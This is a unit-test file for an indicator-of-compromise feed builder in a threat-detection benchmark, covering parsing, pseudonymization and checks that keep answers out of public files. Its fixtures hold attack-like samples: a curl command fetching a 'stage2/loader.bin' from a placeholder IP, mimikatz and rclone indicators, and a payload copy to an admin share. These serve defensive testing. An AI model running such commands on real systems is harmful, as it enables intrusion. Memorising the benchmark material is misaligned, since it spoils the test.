"""Offline unit tests for `benchmark_ioc` (`ioc-feed-1`, regimes, STIX & resealing)."""
import json
from pathlib import Path
import shutil
import tempfile
import unittest

import benchmark_paths  # noqa: F401
from benchmark_contracts import BenchmarkError, load_json, validate_public_bundle, validate_scenario, validate_truth
from benchmark_ioc import (
    IOC_FILE_NAME, IOC_SCHEMA_VERSION, PUBLIC_CTI_SEED_CATALOG, attach_ioc_feed,
    encode_ioc_feed, extract_event_indicators,
    extract_mitre_software_indicators, lookup_indicators, validate_ioc_entry,
    validate_ioc_feed_bytes,
)

HERE = Path(__file__).resolve().parent
FIXTURES = HERE / 'benchmarks'


class BenchmarkIocTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)

    def _make_curated_case(self, case_id='case-a1b2c3d4', with_attack=True):
        case_dir = self.root / case_id
        pub = case_dir / 'public'
        ev_dir = case_dir / 'evaluator'
        pub.mkdir(parents=True)
        ev_dir.mkdir(parents=True)

        base_scenario = load_json(FIXTURES / 'fixtures' / 'case-8b42' / 'scenario.json')
        base_evidence = load_json(FIXTURES / 'fixtures' / 'case-8b42' / 'public' / 'evidence.json')
        base_truth = load_json(FIXTURES / 'fixtures' / base_evidence['case_id'] / 'evaluator' / 'truth.json')

        for item in base_evidence['files']:
            src = FIXTURES / 'fixtures' / 'case-8b42' / 'public' / item['path']
            shutil.copyfile(src, pub / item['path'])

        base_evidence['case_id'] = case_id
        # Enrich events with realistic hashes, pipes, and decoy admin tool indicators
        if base_evidence['events']:
            ev0 = base_evidence['events'][0]
            ev0['fields'] = dict(
                ev0['fields'],
                Hashes='SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855,MD5=d41d8cd98f00b204e9800998ecf8427e',
                PipeName=r'\msagent_77',
            )
        if len(base_evidence['events']) > 1:
            ev_last = base_evidence['events'][-1]
            ev_last['fields'] = dict(
                ev_last['fields'],
                Hashes='SHA256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
                OriginalFileName='rclone.exe',
                UserAgent='rclone/v1.65.2',
            )

        from benchmark_contracts import canonical_bytes, digest_bytes
        ev_bytes = canonical_bytes(base_evidence)
        ev_sha = digest_bytes(ev_bytes)
        base_scenario['scenario_id'] = 'scen-' + case_id
        base_scenario['evidence_manifest_sha256'] = ev_sha
        base_truth['case_id'] = case_id
        base_truth['evidence_manifest_sha256'] = ev_sha
        if not with_attack:
            base_truth['steps'] = []
            base_truth['chain_edges'] = []
            for qid in list(base_truth['assessment_labels']):
                base_truth['assessment_labels'][qid] = 0

        (pub / 'evidence.json').write_bytes(ev_bytes + b'\n')
        (case_dir / 'scenario.json').write_bytes(canonical_bytes(base_scenario) + b'\n')
        (ev_dir / 'truth.json').write_bytes(canonical_bytes(base_truth) + b'\n')
        return case_dir

    def test_seed_catalog_validates_and_never_contains_attack_tokens(self):
        raw = encode_ioc_feed(PUBLIC_CTI_SEED_CATALOG)
        parsed = validate_ioc_feed_bytes(raw)
        self.assertEqual(len(parsed), len(PUBLIC_CTI_SEED_CATALOG))
        for item in parsed:
            self.assertEqual(item['schema_version'], IOC_SCHEMA_VERSION)

    def test_attack_id_and_group_id_in_public_ioc_feed_are_refused(self):
        bad = dict(PUBLIC_CTI_SEED_CATALOG[0], notes='Associated with T1059.001 execution.')
        with self.assertRaises(BenchmarkError) as ctx:
            validate_ioc_entry(bad)
        self.assertEqual(ctx.exception.code, 'truth_public_overlap')

        bad_group = dict(PUBLIC_CTI_SEED_CATALOG[0], notes='Attributed to G0016 campaign.')
        with self.assertRaises(BenchmarkError) as ctx2:
            validate_ioc_entry(bad_group)
        self.assertEqual(ctx2.exception.code, 'truth_public_overlap')

    def test_extract_event_indicators_parses_sysmon_hashes_pipes_and_pseudonyms(self):
        events = [{
            'event_id': 'e1',
            'fields': {
                'timestamp_original': '2026-01-01T00:00:00Z',
                'Hashes': 'MD5=44d88612fea8a8f36de82e1278abb02f,SHA256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f,IMPHASH=f34d5f2d4577ed6d9ceec516c1f5a744',
                'PipeName': r'\mojo.5688.8052.18389493978708887742',
                'DestinationIp': 'address-112233445566',
                'SourceIp': '2001:db8::42',
                'Image': r'C:\Windows\System32\powershell.exe',
                'QueryName': 'name-aabbccddeeff',
            },
        }]
        found = dict(extract_event_indicators(events)['e1'])
        self.assertEqual(found['md5'], '44d88612fea8a8f36de82e1278abb02f')
        self.assertEqual(found['sha256'], '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f')
        self.assertEqual(found['imphash'], 'f34d5f2d4577ed6d9ceec516c1f5a744')
        self.assertEqual(found['named_pipe'], r'\mojo.5688.8052.18389493978708887742')
        self.assertEqual(found['ipv4'], 'address-112233445566')
        self.assertEqual(found['ipv6'], '2001:db8::42')
        self.assertEqual(found['file_name'], 'powershell.exe')
        self.assertEqual(found['domain'], 'name-aabbccddeeff')

    def test_known_vs_novel_apt_zero_ioc_regimes_and_resealing(self):
        known_dir = self._make_curated_case('case-1111aaaa')
        novel_dir = self._make_curated_case('case-2222bbbb')

        known_manifest = attach_ioc_feed(known_dir, regime='known_ioc_pivot', seed=42)
        self.assertEqual(known_manifest['ioc_regime'], 'known_ioc_pivot')
        self.assertGreaterEqual(known_manifest['active_truth_matches'], 1)
        self.assertEqual(load_json(known_dir / 'scenario.json')['ioc_regime'], 'known_ioc_pivot')

        novel_manifest = attach_ioc_feed(novel_dir, regime='novel_apt_zero_ioc', seed=42)
        self.assertEqual(novel_manifest['ioc_regime'], 'novel_apt_zero_ioc')
        self.assertEqual(novel_manifest['active_truth_matches'], 0)
        self.assertEqual(load_json(novel_dir / 'scenario.json')['ioc_regime'], 'novel_apt_zero_ioc')

        known_feed = validate_ioc_feed_bytes((known_dir / 'public' / IOC_FILE_NAME).read_bytes())
        self.assertTrue(any(item['source_feed'] == 'scenario-ti-feed' for item in known_feed))
        self.assertFalse(any(item['source_feed'] == 'public-cti-community-feed' for item in known_feed))

        coverage = load_json(FIXTURES / 'coverage.json')
        for cdir in (known_dir, novel_dir):
            ev = validate_public_bundle(load_json(cdir / 'public' / 'evidence.json'), cdir / 'public')
            validate_scenario(load_json(cdir / 'scenario.json'), coverage)
            validate_truth(load_json(cdir / 'evaluator' / 'truth.json'), ev)
            feed = validate_ioc_feed_bytes((cdir / 'public' / IOC_FILE_NAME).read_bytes())
            self.assertGreaterEqual(len(feed), 10)
            hits = lookup_indicators(feed, indicator_type='sha256')
            self.assertTrue(len(hits) >= 1)

    def test_extract_mitre_software_indicators_scrubs_attack_tokens(self):
        stix = {
            'type': 'bundle',
            'objects': [
                {
                    'type': 'malware',
                    'name': 'Cobalt Strike',
                    'description': 'Commercial adversary beacon (see T1059.003 and G0016) using default named pipe.',
                    'modified': '2025-05-01T12:00:00.000Z',
                },
                {
                    'type': 'tool',
                    'name': 'Impacket',
                    'description': 'Python network protocol toolkit.',
                    'modified': '2025-04-01T00:00:00Z',
                },
            ],
        }
        stix_path = self.root / 'stix.json'
        stix_path.write_text(json.dumps(stix), encoding='utf-8')
        items = extract_mitre_software_indicators(stix_path, limit=10)
        self.assertEqual(len(items), 2)
        validate_ioc_feed_bytes(encode_ioc_feed(items))

    def test_known_ioc_pivot_rejects_empty_entry_indicators_and_host_fqdn_pseudonyms_join(self):
        from benchmark_case_writer import CasePseudonymizer, write_curated_case
        from benchmark_ioc import build_case_ioc_feed
        pseudo = CasePseudonymizer(salt='0123456789abcdef0123456789abcdef')
        tok_fqdn = pseudo.pseudonymize('host', 'UTICA.dmevals.local')
        tok_short = pseudo.pseudonymize('host', 'UTICA')
        self.assertEqual(tok_fqdn, tok_short)
        cleaned = pseudo.clean_content(r'Session from \\UTICA\C$ to \\UTICA.dmevals.local\ADMIN$')
        self.assertEqual(cleaned.count(tok_fqdn), 2)

        # DNS-first FQDN lookup under registered domain or followed by host registration converges to host token
        pseudo_dns_first = CasePseudonymizer(salt='0123456789abcdef0123456789abcdef')
        pseudo_dns_first.register_alias('domain', 'dmevals.local')
        early_unc = pseudo_dns_first.clean_content(r'copy payload \\NASHUA.dmevals.local\C$\Temp\a.exe')
        nashua_host = pseudo_dns_first.pseudonymize('host', 'NASHUA.dmevals.local')
        self.assertIn(nashua_host, early_unc)
        self.assertEqual(pseudo_dns_first.pseudonymize('dns', 'NASHUA.dmevals.local'), nashua_host)

        pseudo_overwrite = CasePseudonymizer(salt='0123456789abcdef0123456789abcdef')
        _ = pseudo_overwrite.pseudonymize('dns', 'FILESRV.corp.example')
        filesrv_host = pseudo_overwrite.pseudonymize('host', 'FILESRV.corp.example')
        self.assertEqual(pseudo_overwrite.pseudonymize('dns', 'FILESRV.corp.example'), filesrv_host)

        # Shared short hostname across two domains keeps distinct host tokens while joining each FQDN across host and dns
        pseudo_collision = CasePseudonymizer(salt='0123456789abcdef0123456789abcdef')
        alpha_tok = pseudo_collision.pseudonymize('host', 'srv.alpha.example')
        beta_tok = pseudo_collision.pseudonymize('host', 'srv.beta.example')
        self.assertNotEqual(alpha_tok, beta_tok)
        self.assertEqual(pseudo_collision.pseudonymize('dns', 'srv.beta.example'), beta_tok)
        self.assertIn(beta_tok, pseudo_collision.clean_content('connect to srv.beta.example'))

        # DNS-first registration (with or without shared shortnames) preserves prior sanitized content joins
        pseudo_dns_pair = CasePseudonymizer(salt='0123456789abcdef0123456789abcdef')
        seen_hosts = []
        for fqdn in ('srv.alpha.example', 'srv.beta.example'):
            first_dns = pseudo_dns_pair.pseudonymize('dns', fqdn)
            content_before = pseudo_dns_pair.clean_content('connect to ' + fqdn)
            host_after = pseudo_dns_pair.pseudonymize('host', fqdn)
            dns_after = pseudo_dns_pair.pseudonymize('dns', fqdn)
            content_after = pseudo_dns_pair.clean_content('connect to ' + fqdn)
            self.assertEqual(host_after, first_dns)
            self.assertEqual(dns_after, host_after)
            self.assertIn(host_after, content_before)
            self.assertIn(host_after, content_after)
            seen_hosts.append(host_after)
        self.assertNotEqual(seen_hosts[0], seen_hosts[1])

        # Curated case writer reconciles any retired alias tokens before sealing public/evidence.json
        pseudo_reconcile = CasePseudonymizer(salt='0123456789abcdef0123456789abcdef')
        stale_dns = pseudo_reconcile.pseudonymize('dns', 'srv.alpha.example')
        early_msg = pseudo_reconcile.clean_content('beacon to srv.alpha.example')
        short_host = pseudo_reconcile.pseudonymize('host', 'srv')
        unified_host = pseudo_reconcile.pseudonymize('host', 'srv.alpha.example')
        self.assertEqual(unified_host, short_host)
        self.assertNotEqual(stale_dns, unified_host)
        rec_out = self.root / 'reconcile_out'
        rec_out.mkdir()
        rec_cov = dict(load_json(FIXTURES / 'fixtures' / 'case-8b42' / 'scenario.json')['coverage'], os=['linux'])
        stale_tag = 'evt-' + stale_dns
        rec_res = write_curated_case(
            rec_out, case_seed='reconcile-seed', family_id='fam-reconcile', split='development',
            provenance='public_replay', coverage_tags=rec_cov,
            difficulty_factors={k: {'score': 0, 'rationale': 'r'} for k in ('noise', 'joins', 'time_span', 'gaps', 'ambiguity')},
            sophistication={'band': 'S1', 'boundaries': [{'boundary_id': 'b1', 'kind': 'host'}]},
            source_references=['https://example.com/ref'],
            assets=[
                {'asset_id': stale_dns, 'os_family': 'linux', 'os_version': '12', 'architecture': 'x86_64', 'vendor': 'debian'},
                {'asset_id': unified_host, 'os_family': 'linux', 'os_version': '12', 'architecture': 'x86_64', 'vendor': 'debian'},
            ],
            sources=[{'source_id': 'src1', 'asset_ids': [stale_dns, unified_host], 'telemetry': None, 'clock_offset_seconds': 0,
                      'clock_uncertainty_seconds': 1, 'sensor_version': '1', 'config_version': '1',
                      'completeness': 'complete', 'source_sha256': 'a' * 64}],
            raw_events=[{'tag': stale_tag, 'timestamp_utc': '2026-01-01T00:00:05Z', 'source_id': 'src1',
                         'asset_id': stale_dns, 'event_type': 'syslog', 'record_id': '1',
                         'fields': {'timestamp_original': '2026-01-01T00:00:05Z', 'msg': early_msg}}],
            step_specs=[{'step_id': 'step-1', 'asset_id': stale_dns, 'technique_id': 'T1071.001',
                         'boundary_id': 'b1', 'phase': 'initial', 'support_tags': [stale_tag]}],
            edges=[], pseudonymizer=pseudo_reconcile, control_case=False,
        )
        sealed_ev = load_json(Path(rec_res['case_dir']) / 'public' / 'evidence.json')
        sealed_tr = load_json(Path(rec_res['case_dir']) / 'evaluator' / 'truth.json')
        self.assertEqual([a['asset_id'] for a in sealed_ev['assets']], [unified_host])
        self.assertIn(unified_host, sealed_ev['events'][0]['fields']['msg'])
        self.assertNotIn(stale_dns, sealed_ev['events'][0]['fields']['msg'])
        self.assertEqual(sealed_tr['steps'][0]['asset_id'], unified_host)
        self.assertEqual(sealed_tr['steps'][0]['support_sets'], [['e000001']])

        # Group ID G#### is rejected across source_feed and indicator_value, not only notes
        for bad_field, bad_val in (('source_feed', 'cti-G0016'), ('indicator_value', 'agent-g0016-loader')):
            bad_entry = dict(PUBLIC_CTI_SEED_CATALOG[-1], **{bad_field: bad_val})
            with self.assertRaises(BenchmarkError) as g_ctx:
                validate_ioc_feed_bytes(encode_ioc_feed([bad_entry]))
            self.assertEqual(g_ctx.exception.code, 'truth_public_overlap')

        # URL command-line extraction emits valid url_path + ipv4/domain, and known_ioc_pivot filters downstream catalog matches
        url_ev = {
            'case_id': 'case-cafe1234',
            'window_utc': {'start_inclusive': '2026-01-01T00:00:00Z', 'end_exclusive': '2026-01-01T01:00:00Z'},
            'events': [
                {'event_id': 'e1', 'fields': {'timestamp_original': '2026-01-01T00:00:01Z',
                                              'CommandLine': 'curl https://198.51.100.77/stage2/loader.bin'}},
                {'event_id': 'e2', 'fields': {'timestamp_original': '2026-01-01T00:05:00Z',
                                              'Image': r'C:\Temp\mimikatz.exe'}},
            ],
        }
        url_tr = {'steps': [
            {'step_id': 's1', 'window_utc': {'start_inclusive': '2026-01-01T00:00:01Z', 'end_exclusive': '2026-01-01T00:00:10Z'},
             'support_sets': [['e1']]},
            {'step_id': 's2', 'window_utc': {'start_inclusive': '2026-01-01T00:05:00Z', 'end_exclusive': '2026-01-01T00:05:10Z'},
             'support_sets': [['e2']]},
        ]}
        url_entries, url_manifest = build_case_ioc_feed(url_ev, url_tr, regime='known_ioc_pivot')
        self.assertGreaterEqual(len(url_manifest['active_entry_indicators']), 1)
        active_vals = {e['indicator_value'].lower() for e in url_entries if e['status'] == 'active'}
        self.assertNotIn('mimikatz.exe', active_vals)

        # Partially missing conjunctive support_tags list is rejected rather than weakened
        conj_out = self.root / 'conj_out'
        conj_out.mkdir()
        base_cov = dict(load_json(FIXTURES / 'fixtures' / 'case-8b42' / 'scenario.json')['coverage'], os=['linux'])
        with self.assertRaises(BenchmarkError) as conj_ctx:
            write_curated_case(
                conj_out, case_seed='conj-seed', family_id='fam-conj', split='development',
                provenance='public_replay', coverage_tags=base_cov,
                difficulty_factors={k: {'score': 0, 'rationale': 'r'} for k in ('noise', 'joins', 'time_span', 'gaps', 'ambiguity')},
                sophistication={'band': 'S1', 'boundaries': [{'boundary_id': 'b1', 'kind': 'host'}]},
                source_references=['https://example.com/ref'],
                assets=[{'asset_id': 'h1', 'os_family': 'linux', 'os_version': '12', 'architecture': 'x86_64', 'vendor': 'debian'}],
                sources=[{'source_id': 'src1', 'asset_ids': ['h1'], 'telemetry': None, 'clock_offset_seconds': 0,
                          'clock_uncertainty_seconds': 1, 'sensor_version': '1', 'config_version': '1',
                          'completeness': 'complete', 'source_sha256': 'a' * 64}],
                raw_events=[{'tag': 'present_a', 'timestamp_utc': '2026-01-01T00:00:05Z', 'source_id': 'src1',
                             'asset_id': 'h1', 'event_type': 'syslog', 'record_id': '1',
                             'fields': {'timestamp_original': '2026-01-01T00:00:05Z', 'msg': 'hello'}}],
                step_specs=[{'step_id': 'step-1', 'asset_id': 'h1', 'technique_id': 'T1082',
                             'boundary_id': 'b1', 'phase': 'initial', 'support_tags': [['present_a', 'missing_b']]}],
                edges=[], pseudonymizer=CasePseudonymizer(salt='fedcba9876543210fedcba9876543210'),
                control_case=False,
            )
        self.assertEqual(conj_ctx.exception.code, 'empty_support_sets')
        self.assertEqual(list(conj_out.iterdir()), [])

        # known_ioc_pivot fails when truth steps contain zero extractable non-benign indicators
        empty_ev = {
            'case_id': 'case-deadbeef',
            'window_utc': {'start_inclusive': '2026-01-01T00:00:00Z', 'end_exclusive': '2026-01-01T01:00:00Z'},
            'events': [{'event_id': 'e1', 'fields': {'timestamp_original': '2026-01-01T00:00:01Z', 'Image': 'cmd.exe'}}],
        }
        empty_tr = {'steps': [{
            'step_id': 's1',
            'window_utc': {'start_inclusive': '2026-01-01T00:00:01Z', 'end_exclusive': '2026-01-01T00:00:02Z'},
            'support_sets': [['e1']],
        }]}
        with self.assertRaises(BenchmarkError) as ctx:
            build_case_ioc_feed(empty_ev, empty_tr, regime='known_ioc_pivot')
        self.assertEqual(ctx.exception.code, 'missing_known_ioc_pivot')

        # Rejected case_dir is cleaned up on leak failure
        bad_out = self.root / 'leak_out'
        bad_out.mkdir()
        base_cov_tags = load_json(FIXTURES / 'fixtures' / 'case-8b42' / 'scenario.json')['coverage']
        base_cov_tags = dict(base_cov_tags, os=['linux'])
        with self.assertRaises(BenchmarkError) as leak_ctx:
            write_curated_case(
                bad_out, case_seed='leak-seed', family_id='fam-leak', split='development',
                provenance='public_replay',
                coverage_tags=base_cov_tags,
                difficulty_factors={k: {'score': 0, 'rationale': 'r'} for k in ('noise', 'joins', 'time_span', 'gaps', 'ambiguity')},
                sophistication={'band': 'S0', 'boundaries': []},
                source_references=['https://example.com/ref'],
                assets=[{'asset_id': 'h1', 'os_family': 'linux', 'os_version': '12', 'architecture': 'x86_64', 'vendor': 'debian'}],
                sources=[{'source_id': 'src1', 'asset_ids': ['h1'], 'telemetry': None, 'clock_offset_seconds': 0,
                          'clock_uncertainty_seconds': 1, 'sensor_version': '1', 'config_version': '1',
                          'completeness': 'complete', 'source_sha256': 'a' * 64}],
                raw_events=[{'tag': 't1', 'timestamp_utc': '2026-01-01T00:00:05Z', 'source_id': 'src1',
                             'asset_id': 'h1', 'event_type': 'syslog', 'record_id': '1',
                             'fields': {'timestamp_original': '2026-01-01T00:00:05Z', 'msg': 'stratus-red-team marker'}}],
                step_specs=[], edges=[], pseudonymizer=pseudo, control_case=True,
            )
        self.assertEqual(leak_ctx.exception.code, 'forbidden_public_metadata')
        self.assertEqual(list(bad_out.iterdir()), [])


if __name__ == '__main__':
    unittest.main()
